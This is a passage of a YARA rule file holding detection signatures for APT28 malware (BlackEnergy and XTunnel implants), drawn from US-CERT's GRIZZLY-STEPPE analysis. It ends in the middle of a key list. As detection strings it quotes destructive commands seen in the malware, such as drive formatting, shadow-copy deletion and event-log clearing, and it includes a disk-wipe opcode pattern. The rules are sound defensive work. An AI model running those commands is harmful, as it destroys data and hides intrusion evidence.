\"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_3_v3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = \".?AVAgentKernel@@\"\n        $STR2 = \".?AVIAgentModule@@\"\n        $STR3 = \"AgentKernel\"\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and any of them\n}\n\nrule APT28_IMPLANT_4_v1\n{\n    meta:\n        description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n        threat_names = \"BlackEnergy/Voodoo Bear, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_4_v1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = {55 8B EC 81 EC 54 01 00 00 83 65 D4 00 C6 45 D8 61 C6 45 D9 64\n         C6 45 DA 76 C6 45 DB 61 C6 45 DC 70 C6 45 DD 69 C6 45 DE 33 C6 45 DF\n         32 C6 45 E0 2EE9 ?? ?? ?? ??}\n        $STR2 = {C7 45 EC 5A 00 00 00 C7 45 E0\n            46 00 00 00 C7 45 E8 5A 00 00 00 C7 45 E4 46 00 00 00}\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and 1 of them\n}\n\nrule APT28_IMPLANT_4_v2\n{\n    meta:\n        description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n        threat_names = \"BlackEnergy/Voodoo Bear, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_4_v2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $BUILD_USER32 = {75 73 65 72 ?? ?? ?? 33 32 2E 64}\n        $BUILD_ADVAPI32 = {61 64 76 61 ?? ?? ?? 70 69 33 32}\n        $CONSTANT = {26 80 AC C8}\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}\n\nrule APT28_IMPLANT_4_v3_AlternativeRule\n{\n    meta:\n        description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n        threat_names = \"BlackEnergy/Voodoo Bear, APT28\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_4_v3_AlternativeRule\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $op1 = { 33 c9 41 ff 13 13 c9 ff 13 72 f8 c3 53 1e 01 00 }\n        $op2 = { 21 da 40 00 00 a0 40 00 08 a0 40 00 b0 70 40 00 }\n\n    condition:\n        (uint16(0) == 0x5a4d and all of them)\n}\n\nrule APT28_IMPLANT_4_v4\n{\n    meta:\n        description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n        threat_names = \"BlackEnergy/Voodoo Bear, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_4_v4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $DK_format1 = \"/c format %c: /Y /Q\" ascii\n        $DK_format2 = \"/c format %c: /Y /X /FS:NTFS\" ascii\n        $DK_physicaldrive = \"PhysicalDrive%d\" wide\n        $DK_shutdown = \"shutdown /r /t %d\"\n\n    condition:\n        uint16(0) == 0x5A4D and all of ($DK*)\n}\n\nrule APT28_IMPLANT_4_v5\n{\n    meta:\n        description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n        threat_names = \"BlackEnergy/Voodoo Bear, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_4_v5\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $GEN_HASH = {0F BE C9 C1 C0 07 33 C1}\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}\n\nrule APT28_IMPLANT_4_v7\n{\n    meta:\n        description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n        threat_names = \"BlackEnergy/Voodoo Bear, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_4_v7\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $sb1 = {C7 [1-5] 33 32 2E 64 C7 [1-5] 77 73 32 5F 66 C7 [1-5] 6C 6C}\n        $sb2 = {C7 [1-5] 75 73 65 72 C7 [1-5] 33 32 2E 64 66 C7 [1-5] 6C 6C}\n        $sb3 = {C7 [1-5] 61 64 76 61 C7 [1-5] 70 69 33 32 C7 [1-5] 2E 64 6C 6C}\n        $sb4 = {C7 [1-5] 77 69 6E 69 C7 [1-5] 6E 65 74 2E C7 [1-5] 64 6C 6C}\n        $sb5 = {C7 [1-5] 73 68 65 6C C7 [1-5] 6C 33 32 2E C7 [1-5] 64 6C 6C}\n        $sb6 = {C7 [1-5] 70 73 61 70 C7 [1-5] 69 2E 64 6C 66 C7 [1-5] 6C}\n        $sb7 = {C7 [1-5] 6E 65 74 61 C7 [1-5] 70 69 33 32 C7 [1-5] 2E 64 6C 6C}\n        $sb8 = {C7 [1-5] 76 65 72 73 C7 [1-5] 69 6F 6E 2E C7 [1-5] 64 6C 6C}\n        $sb9 = {C7 [1-5] 6F 6C 65 61 C7 [1-5] 75 74 33 32 C7 [1-5] 2E 64 6C 6C}\n        $sb10 = {C7 [1-5] 69 6D 61 67 C7 [1-5] 65 68 6C 70 C7 [1-5] 2E 64 6C 6C}\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and 3 of them\n}\n\nrule APT28_IMPLANT_4_v8\n{\n    meta:\n        description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n        threat_names = \"BlackEnergy/Voodoo Bear, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_4_v8\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $f1 = {5E 81 EC 04 01 00 00 8B D4 68 04 01 00 00 52 6A 00 FF 57 1C 8B D4\n         33 C9 03 D0 4A 41 3B C8 74 05 80 3A 5C 75 F5 42 81 EC 04 01 00 00 8B\n         DC 52 51 53 68 04 01 00 00 FF 57 20 59 5A 66 C7 04 03 5C 20 56 57 8D\n         3C 03 8B F2 F3 A4 C6 07 00 5F 5E 33 C0 50 68 80 00 00 00 6A 02 50 50\n         68 00 00 00 40 53 FF 57 14 53 8B 4F 4C 8B D6 33 DB 30 1A 42 43 3B D9\n         7C F8 5B 83 EC 04 8B D4 50 6A 00 52 FF 77 4C 8B D6 52 50 FF 57 24 FF\n         57 18}\n        $f2 = {5E 83 EC 1C 8B 45 08 8B 4D 08 03 48 3C 89 4D E4 89 75 EC 8B 45 08\n         2B 45 10 89 45 E8 33 C0 89 45 F4 8B 55 0C 3B 55 F4 0F 86 98 00 00 00\n         8B 45 EC 8B 4D F4 03 48 04 89 4D F4 8B 55 EC 8B 42 04 83 E8 08 D1 E8\n         89 45 F8 8B 4D EC 83 C1 08 89 4D FC}\n        $f3 = {5F 8B DF 83 C3 60 2B 5F 54 89 5C 24 20 8B 44 24 24 25 00 00 FF FF\n         66 8B 18 66 81 FB 4D 5A 74 07 2D 00 00 01 00 EB EF 8B 48 3C 03 C8 66\n         8B 19 66 81 FB 50 45 75 E0 8B E8 8B F7 83 EC 60 8B FC B9 60 00 00 00\n         F3 A4 83 EF 60 6A 0D 59 E8 88 00 00 00 E2 F9 68 6C 33 32 00 68 73 68\n         65 6C 54 FF 57}\n        $a1 = {83 EC 04 60 E9 1E 01 00 00}\n\n    condition:\n        $a1 at pe.entry_point or any of ($f*)\n}\n\nrule APT28_IMPLANT_4_v9\n{\n    meta:\n        description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n        threat_names = \"BlackEnergy/Voodoo Bear, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_4_v9\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = \"wevtutil clear-log\" ascii wide nocase\n        $b = \"vssadmin delete shadows\" ascii wide nocase\n        $c = \"AGlobal\\\\23d1a259-88fa-41df-935f-cae523bab8e6\" ascii wide nocase\n        $d = \"Global\\\\07fd3ab3-0724-4cfd-8cc2-60c0e450bb9a\" ascii wide nocase\n        $openPhysicalDiskOverwriteWithZeros = { 57 55 33 C9 51 8B C3 99 57 52\n         50 E8 ?? ?? ?? ?? 52 50 E8 ?? ?? ?? ?? 83 C4 10 84 C0 75 21 33 C0 89\n         44 24 10 89 44 24 14 6A 01 8B C7 99 8D 4C 24 14 51 52 50 56 FF 15 ??\n         ?? ?? ?? 85 C0 74 0B 83 C3 01 81 FB 00 01 00 00 7C B6 }\n        $f = {83 c4 0c 53 53 6a 03 53 6a 03 68 00 00 00 c0}\n\n    condition:\n        ($a and $b) or $c or $d or ($openPhysicalDiskOverwriteWithZeros and $f)\n}\n\nrule APT28_IMPLANT_4_v10\n{\n    meta:\n        description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n        threat_names = \"BlackEnergy/Voodoo Bear, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_4_v10\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $ = {A1B05C72}\n        $ = {EB3D0384}\n        $ = {6F45594E}\n        $ = {71815A4E}\n        $ = {D5B03E72}\n        $ = {6B43594E}\n        $ = {F572993D}\n        $ = {665D9DC0}\n        $ = {0BE7A75A}\n        $ = {F37443C5}\n        $ = {A2A474BB}\n        $ = {97DEEC67}\n        $ = {7E0CB078}\n        $ = {9C9678BF}\n        $ = {4A37A149}\n        $ = {8667416B}\n        $ = {0A375BA4}\n        $ = {DC505A8D}\n        $ = {02F1F808}\n        $ = {2C819712}\n\n    condition:\n        uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550 and 15 of them\n}\n\nrule APT28_IMPLANT_4_v11\n{\n    meta:\n        description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n        threat_names = \"BlackEnergy/Voodoo Bear, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_4_v11\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $ = \"/c format %c: /Y /X /FS:NTFS\"\n        $ = \".exe.sys.drv.doc.docx.xls.xlsx.mdb.ppt.pptx.xml.jpg.jpeg.ini.inf.ttf\" wide\n        $ = \".dll.exe.xml.ttf.nfo.fon.ini.cfg.boot.jar\" wide\n        $ = \".crt.bin.exe.db.dbf.pdf.djvu.doc.docx.xls.xlsx.jar.ppt.pptx.tib.vhd.iso.lib.mdb.accdb.sql.mdf.xml.rtf.ini.cf g.boot.txt.rar.msi.zip.jpg.bmp.jpeg.tiff\" wide\n        $tempfilename = \"%ls_%ls_%ls_%d.~tmp\" ascii wide\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and 2 of them\n}\n\nrule APT28_IMPLANT_4_v13\n{\n    meta:\n        description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n        threat_names = \"BlackEnergy/Voodoo Bear, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_4_v13\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $XMLDOM1 = {81 BF 33 29 36 7B D2 11 B2 0E 00 C0 4F 98 3E 60}\n        $XMLDOM2 = {90 BF 33 29 36 7B D2 11 B2 0E 00 C0 4F 98 3E 60}\n        $XMLPARSE = {8B 06 [0-2] 8D 55 ?C 52 FF 75 08 [0-2] 50 FF 91 04 01 00 00\n         66 83 7D ?C FF 75 3? 8B 06 [0-2] 8D 55 F? 52 50 [0-2] FF 51 30 85 C0\n         78 2?}\n        $EXP1 = \"DispatchCommand\"\n        $EXP2 = \"DispatchEvent\"\n        $BDATA = {85 C0 74 1? 0F B7 4? 06 83 C? 28 [0-6] 72 ?? 33 C0 5F 5E 5B 5D\n         C2 08 00 8B 4? 0? 8B 4? 0? 89 01 8B 4? 0C 03 [0-2] EB E?}\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}\n\nrule APT28_IMPLANT_5_v1\n{\n    meta:\n        description = \"XTunnel Implant by APT28\"\n        threat_names = \"XTunnel, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_5_v1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $hexstr = {2D 00 53 00 69 00 00 00 2D 00 53 00 70 00 00 00 2D 00 55 00\n         70 00 00 00 2D 00 50 00 69 00 00 00 2D 00 50 00 70 00 00 00}\n        $UDPMSG1 = \"error 2005 recv from server UDP - %d\\x0a\"\n        $TPSMSG1 = \"error 2004 send to TPS - %d\\x0a\"\n        $TPSMSG2 = \"error 2003 recv from TPS - %d\\x0a\"\n        $UDPMSG2 = \"error 2002 send to server UDP - %d\\x0a\"\n\n    condition:\n        any of them\n}\n\nrule APT28_IMPLANT_5_v2\n{\n    meta:\n        description = \"XTunnel Implant by APT28\"\n        threat_names = \"XTunnel, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_5_v2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $key0 = { 987AB999FE0924A2DF0A412B14E26093746FCDF9BA31DC05536892C33B116AD3 }\n        $key1 = { 8B236C892D902B0C9A6D37AE4F9842C3070FBDC14099C6930158563C6AC00FF5 }\n        $key2 = { E47B7F110CAA1DA617545567EC972AF3A6E7B4E6807B7981D3CFBD3D8FCC3373 }\n        $key3 = { 48B284545CA1FA74F64FDBE2E605D68CED8A726D05EBEFD9BAAC164A7949BDC1 }\n        $key4 = { FB421558E30FCCD95FA7BC45AC92D2991C44072230F6FBEAA211341B5BF2DC56 }\n        $key5 = { 34F1AE17017AF16021ADA5CE3F77675BBC6E7DEC6478D6078A0B22E5FDFF3B31 }\n        $key6 = { F0EA48F164395186E6F754256EBB812A2AFE168E77ED9501F8B8E6F5B72126A7 }\n        $key7 = { 0B6E9970A8EAF68EE14AB45005357A2F3391BEAA7E53AB760B916BC2B3916ABE }\n        $key8 = { FF032EA7ED2436CF6EEA1F741F99A3522A61FDA8B5A81EC03A8983ED1AEDAB1A }\n        $key9 = { F0DAC1DDFEF7AC6DE1CBE1006584538FE650389BF8565B32E0DE1FFACBCB14BB }\n        $key10 = { A5D699A3CD4510AF11F1AF767602055C523DF74B94527D74319D6EFC6883B80D }\n        $key11 = { 5951B02696C1D5A7B2851D28872384DA607B25F4CEA268FF3FD7FBA75AB3B4B3 }\n        $key12 = { 0465D99B26AF42D8346001BB838595E301BAD8CF5D40CE9C17C944717DF82481 }\n        $key13 = { 5DFE1C83AD5F5CE1BF5D9C42E23225E3ECFDB2493E80E6554A2AC7C722EB4880 }\n        $key14 = { E9650396C45F7783BC14C59F46EA8232E8357C26B5627BFF8C42C6AE2E0F2E17 }\n        $key15 = { 7432AE389125BB4E3980ED7F6A6FB252A42E785A90F4591C3620CA642FF97CA3 }\n        $key16 = { 2B2ADBBC4F960A8916F7088067BAD30BE84B65783FBF9476DF5FDA0E5856B183 }\n        $key17 = { 808C3FD0224A59384161B8A81C8BB404D7197D16D8118CB77067C5C8BD764B3E }\n        $key18 = { 028B0E24D5675C16C815BFE4A073E9778C668E65771A1CE881E2B03F58FC7D5B }\n        $key19 = { 878B7F5CF2DC72BAF1319F91A4880931EE979665B1B24D3394FE72EDFAEF4881 }\n        $key20 = { 7AC7DD6CA34F269481C526254D2F563BC6ECA1779FEEAA33EC1C20E60B686785 }\n        $key21 = { 3044F1D394186815DD8E3A2BBD9166837D07FA1CF6A550E2C170C9CDD9305209 }\n        $key22 = { 7544DC095C441E39D258648FE9CB1267D20D83C8B2D3AB734474401DA4932619 }\n        $key23 = { D702223347406C1999D1A9829CBBE96EC86D377A40E2EE84562EA1FAC1C71498 }\n        $key24 = { CA36CB1177382A1009D392A58F7C1357E94AD2292CC0AE82EE4F7DB0179148E1 }\n        $key25 = { C714F23E4C1C4E55F0E1FA7F5D0DD64658A86F84681D07576D840784154F65DC }\n        $key26 = { 63571BAF736904634AFEE2A70CB9ED64615DE8CA7AEF21E773286B8877D065DB }\n        $key27 = { 27808A9BE98FFE348DE1DB999AC9FDFB26E6C5A0D5E688490EF3D186C43661EB }\n        $key28 = { B6EB86A07A85D40866AFA100789FFB9E85C13F5AA7C7A3B6BA753C7EAB9D6A62 }\n        $key29 = { 88F0020375D60BDB85ACDBFE4BD79CD098DB2B3FA2CEF55D4331DBEFCE455157 }\n        $key30 = { 36535AAB296587AE1162AC5D39492DD1245811C72706246A38FF590645AA5D7B }\n        $key31 = { FDB726261CADD52E10818B49CAB81BEF112CB63832DAA26AD9FC711EA6CE99A4 }\n        $key32 = { 86C0CAA26D9FD07D215BC7EB14E2DA250E905D406AFFAB44FB1C62A2EAFC4670 }\n        $key33 = { BC101329B0E3A7D13F6EBC535097785E27D59E92D449D6D06538725034B8C0F0 }\n        $key34 = { C8D31A78B7C149F62F06497F9DC1DDC4967B566AC52C3A2A65AC7A99643B8A2D }\n        $key35 = { 0EA4A5C565EFBB94F5041392C5F0565B6BADC630D9005B3EADD5D81110623E1F }\n        $key36 = { 06E4E46BD3A0FFC8A4125A6A02B0C56D5D8B9E378CF97539CE4D4ADFAF89FEB5 }\n        $key37 = { 6DE22040821F0827316291331256A170E23FA76E381CA7066AF1E5197AE3CFE7 }\n        $key38 = { C6EF27480F2F6F40910074A45715143954BBA78CD74E92413F785BBA5B2AA121 }\n        $key39 = { 19C96A28F8D9698ADADD2E31F2426A46FD11D2D45F64169EDC7158389BFA59B4 }\n        $key40 = { C3C3DDBB9D4645772373A815B5125BB2232D8782919D206E0E79A6A973FF5D36 }\n        $key41 = { C33AF1608037D7A3AA7FB860911312B4409936D236564044CFE6ED42E54B78A8 }\n        $key42 = { 856A0806A1DFA94B5E62ABEF75BEA3B657D9888E30C8D2FFAEC042930BBA3C90 }\n        $key43 = { 244496C524401182A2BC72177A15CDD2EF55601F1D321ECBF2605FFD1B9B8E3F }\n        $key44 = { DF24050364168606D2F81E4D0DEB1FFC417F1B5EB13A2AA49A89A1B5242FF503 }\n        $key45 = { 54FA07B8108DBFE285DD2F92C84E8F09CDAA687FE492237F1BC4343FF4294248 }\n        $key46 = { 23490033D6BF165B9C45EE65947D6E6127D6E00C68038B83C8BFC2BCE905040C }\n        $key47 = { 4E044025C45680609B6EC52FEB3491130A711F7375AAF63D69B9F952BEFD5F0C }\n        $key48 = { 019F31C5F5B2269020EBC00C1F511F2AC23E9D37E89374514C6DA40A6A03176C }\n        $key49 = { A2483197FA57271B43E7276238468CFB8429326CBDA7BD091461147F642BEB06 }\n        $key50 = { 731C9D6E74C589B7ACB019E5F6A6E07ACF12E68CB9A396CE05AA4D69D5387048 }\n        $key51 = { 540DB6C8D23F7F7FEF9964E53F445F0E56459B10E931DEEEDB2B57B063C7F8B7 }\n        $key52 = { D5AF80A7EEFF26DE988AC3D7CE23E62568813551B2133F8D3E973DA15E355833 }\n        $key53 = { E4D8DBD3D801B1708C74485A972E7F00AFB45161C791EE05282BA68660FFBA45 }\n        $key54 = { D79518AF96C920223D687DD596FCD545B126A678B7947EDFBF24661F232064FB }\n        $key55 = { B57CAA4B45CA6E8332EB58C8E72D0D9853B3110B478FEA06B35026D7708AD225 }\n        $key56 = { 077C714C47DFCF79CA2742B1544F4AA8035BB34AEA9D519DEE77745E01468408 }\n        $key57 = { C3F5550AD424839E4CC54FA015994818F4FB62DE99B37C872AF0E52C376934FA }\n        $key58 = { 5E890432AE87D0FA4D209A62B9E37AAEDEDC8C779008FEBAF9E4E6304D1B2AAC }\n        $key59 = { A42EDE52B5AF4C02CFE76488CADE36A8BBC3204BCB1E05C402ECF450071EFCAB }\n        $key60 = { 4CDAFE02894A04583169E1FB4717A402DAC44DA6E2536AE53F5F35467D31F1CA }\n        $key61 = { 0BEFCC953AD0ED6B39CE6781E60B83C0CFD166B124D1966330CBA9ADFC9A7708 }\n        $key62 = { 8A439DC4148A2F4D5996CE3FA152FF702366224737B8AA6784531480ED8C8877 }\n        $key63 = { CF253BE3B06B310901FF48A351471374AD35BBE4EE654B72B860F2A6EC7B1DBB }\n        $key64 = { A0599F50C4D059C5CFA16821E97C9596B1517B9FB6C6116F260415127F32CE1F }\n        $key65 = { 8B6D704F3DC9150C6B7D2D54F9C3EAAB14654ACA2C5C3952604E65DF8133FE0C }\n        $key66 = { A06E5CDD3871E9A3EE17F7E8DAE193EE47DDB87339F2C599402A78C15D77CEFD }\n        $key67 = { E52ADA1D9BC4C089DBB771B59904A3E0E25B531B4D18B58E432D4FA0A41D9E8A }\n        $key68 = { 4778A7E23C686C171FDDCCB8E26F98C4CBEBDF180494A647C2F6E7661385F05B }\n        $key69 = { FE983D3A00A9521F871ED8698E702D595C0C7160A118A7630E8EC92114BA7C12 }\n        $key70 = { 52BA4C52639E71EABD49534BBA80A4168D15762E2D1D913BAB5A5DBF14D9D166 }\n        $key71 = { 931EB8F7BC2AE1797335C42DB56843427EB970ABD601E7825C4441701D13D7B1 }\n        $key72 = { 318FA8EDB989672DBE2B5A74949EB6125727BD2E28A4B084E8F1F50604CCB735 }\n        $key73 = { 5B5F2315E88A42A7B59C1B493AD15B92F819C021BD70A5A6619AAC6666639BC2 }\n        $key74 = { C2BED7AA481951FEB56C47F03EA38236BC425779B2FD1F1397CB79FE2E15C0F0 }\n        $key75 = { D3979B1CB0EC1A655961559704D7CDC019253ACB2259DFB92558B7536D774441 }\n        $key76 = { 0EDF5DBECB772424D879BBDD51899D6AAED736D0311589566D41A9DBB8ED1CC7 }\n        $key77 = { CC798598F0A9BCC82378A5740143DEAF1A147F4B2908A197494B7202388EC905 }\n        $key78 = { 074E9DF7F859BF1BD1658FD2A86D81C282000EAB09AF4252FAB45433421D3849 }\n        $key79 = { 6CD540642E007F00650ED20D7B54CFFD54DDA95D8DEBB087A004BAE222F22C8E }\n        $key80 = { C76CF2F66C71F6D17FC8DEFA1CAEF8718BA1CE188C7EA02C835A0FA54D3B3314 }\n        $key81 = { A7250A149600E515C9C40FE5720756FDA8251635A3B661261070CB5DABFE7253 }\n        $key82 = { 237C67B97D4CCE4610DE2B82E582808EA796C34A4C24715C953CBA403B2C935E }\n        $key83 = { A8FA182547E66B57C497DAAA195A38C0F0FB0A3C1F7B98B4B852F5F37E885127 }\n        $key84 = { 83694CCA50B821144FFBBE6855F62845F1328111AE1AC5666CBA59EB43AA12C6 }\n        $key85 = { 145E906416B17865AD37CD022DF5481F28C930D6E3F53C50B0953BF33F4DB953 }\n        $key86 = { AB49B7C2FA3027A767F5AA94EAF2B312BBE3E89FD924EF89B92A7CF977354C22 }\n        $key87 = { 7E04E478340C209B01CA2FEBBCE3FE77C6E6169F0B0528C42FA4BDA6D90AC957 }\n        $key88 = { 0EADD042B9F0DDBABA0CA676EFA4EDB68A045595097E5A392217DFFC21A8532F }\n        $key89 = { 5623710F134ECACD5B70434A1431009E3556343ED48E77F6A557F2C7FF46F655 }\n        $key90 = { 6968657DB62F4A119F8E5CB3BF5C51F4B285328613AA7DB9016F8000B576561F }\n        $key91 = { DEBB9C95EAE6A68974023C335F8D2711135A98260415DF05845F053AD65B59B4 }\n        $key92 = { 16F54900DBF08950F2C5835153AB636605FB8C09106C0E94CB13CEA16F275685 }\n        $key93 = { 1C9F86F88F0F4882D5CBD32876368E7B311A84418692D652A6A4F315CC499AE8 }\n        $key94 = { E920E0783028FA05F4CE2D6A04BBE636D56A775CFD4DAEA3F2A1B8BEEB52A6D4 }\n        $key95 = { 73874CA3AF47A8A315D50E1990F44F655EC7C15B146FFE0611B6C4FC096BD07C }\n        $key96 = { F21C1FA163C745789C53922C47E191A5A85301BDC2FFC3D3B688CFBFF39F3BE5 }\n        $key97 = { BC5A861F21CB98BD1E2AE9650B7A0BB4CD0C71900B3463C1BC3380AFD2BB948E }\n        $key98 = { 151BAE36E646F30570DC6A7B57752F2481A0B48DD5184E914BCF411D8AD5ACA0 }\n        $key99 = { F05AD6D7A0CADC10A6468BFDBCBB223D5BD6CA30EE19C239E8035772D80312C9 }\n        $key100 = { 5DE9A0FDB37C0D59C298577E5379BCAF4F86DF3E9FA17787A4CEFA7DD10C462E }\n        $key101 = { F5E62BA862380224D159A324D25FD321E5B35F8554D70CF9A506767713BCA508 }\n        $key102 = { A2D1B10409B328DA0CCBFFDE2AD2FF10855F95DA36A1D3DBA84952BB05F8C3A7 }\n        $key103 = { C974ABD227D3AD339FAC11C97E11D904706EDEA610B181B8FAD473FFCC36A695 }\n        $key104 = { AB5167D2241406C3C0178D3F28664398D5213EE5D2C09DCC9410CB604671F5F1 }\n        